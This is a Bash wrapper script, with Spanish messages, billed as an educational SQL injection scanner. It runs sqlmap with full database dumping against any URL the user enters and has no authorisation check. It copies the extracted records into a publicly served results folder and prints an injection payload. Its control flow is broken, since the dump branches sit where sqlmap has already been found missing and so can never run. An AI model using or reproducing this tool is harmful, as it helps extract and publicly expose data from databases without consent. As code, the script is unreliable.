#!/bin/bash
# SANTRIX SQL Injection Scanner (Educational tool for security students)
# This tool uses sqlmap if installed, or provides a structured wrapper for testing.

echo "#################################################"
echo "#                                               #"
echo "#          SANTRIX SQLi Scanner v1.1            #"
echo "#      (Authorized Security Testing Tool)        #"
echo "#                                               #"
echo "#################################################"
echo ""

if ! command -v sqlmap &> /dev/null
then
    echo "[!] sqlmap no está instalado en el entorno nix por defecto."
    echo "[+] Intentando ejecutar escaneo manual de parámetros..."
    
    read -p "Introduce la URL objetivo (ej: http://test.com/login): " TARGET
    read -p "Introduce los datos POST (opcional, ej: user=admin&pass=123): " POST_DATA
    
    if [ -z "$TARGET" ]; then
        echo "[!] Error: URL no válida."
        exit 1
    fi

    echo "[+] Analizando $TARGET..."
    
    # Directorio para guardar los resultados
    RESULT_DIR="public/results"
    mkdir -p $RESULT_DIR
    OUTPUT_FILE="$RESULT_DIR/sql_scan_$(date +%Y%m%d_%H%M%S).txt"

    if [ ! -z "$POST_DATA" ]; then
        echo "[+] Probando inyección en parámetros POST: $POST_DATA"
        if command -v sqlmap &> /dev/null; then
            echo "[!] EXTRACCIÓN AUTOMATIZADA INICIADA..."
            # Ejecución completa automatizada con guardado en archivo
            sqlmap -u "$TARGET" --data="$POST_DATA" --batch --banner --dbs --tables --dump --threads=5 --output-dir="/tmp/sqlmap_out"
            
            # Consolidar resultados en un archivo .txt
            echo "--- RESULTADOS DE ESCANEO SQLi SANTRIX ---" > "$OUTPUT_FILE"
            echo "URL: $TARGET" >> "$OUTPUT_FILE"
            echo "POST Data: $POST_DATA" >> "$OUTPUT_FILE"
            echo "Fecha: $(date)" >> "$OUTPUT_FILE"
            echo "------------------------------------------" >> "$OUTPUT_FILE"
            
            # Buscar datos extraídos y moverlos al archivo txt
            find /tmp/sqlmap_out -name "*.csv" -exec cat {} + >> "$OUTPUT_FILE" 2>/dev/null
            
            echo ""
            echo "[+] ESCANEO COMPLETADO."
            echo "[+] Resultados guardados en: $OUTPUT_FILE"
            echo "[+] Puedes acceder a ellos vía web en: /results/$(basename "$OUTPUT_FILE")"
        else
            echo "    [TEST POST] ' OR '1'='1"
        fi
    else
        echo "[+] Probando inyección en parámetros de URL/Headers..."
        if command -v sqlmap &> /dev/null; then
            echo "[!] EXTRACCIÓN AUTOMATIZADA INICIADA..."
            sqlmap -u "$TARGET" --batch --banner --dbs --tables --dump --threads=5 --output-dir="/tmp/sqlmap_out"
            
            echo "--- RESULTADOS DE ESCANEO SQLi SANTRIX ---" > "$OUTPUT_FILE"
            echo "URL: $TARGET" >> "$OUTPUT_FILE"
            echo "Fecha: $(date)" >> "$OUTPUT_FILE"
            echo "------------------------------------------" >> "$OUTPUT_FILE"
            
            find /tmp/sqlmap_out -name "*.csv" -exec cat {} + >> "$OUTPUT_FILE" 2>/dev/null
            
            echo ""
            echo "[+] ESCANEO COMPLETADO."
            echo "[+] Resultados guardados en: $OUTPUT_FILE"
            echo "[+] Puedes acceder a ellos vía web en: /results/$(basename "$OUTPUT_FILE")"
        else
            echo "    [TEST GET] $TARGET?id='"
        fi
    fi
    
    echo ""
    echo "[*] Sugerencia: Para auditorías reales, usa 'sqlmap -u \"$TARGET\" --forms --crawl=2'"
else
    sqlmap "$@"
fi
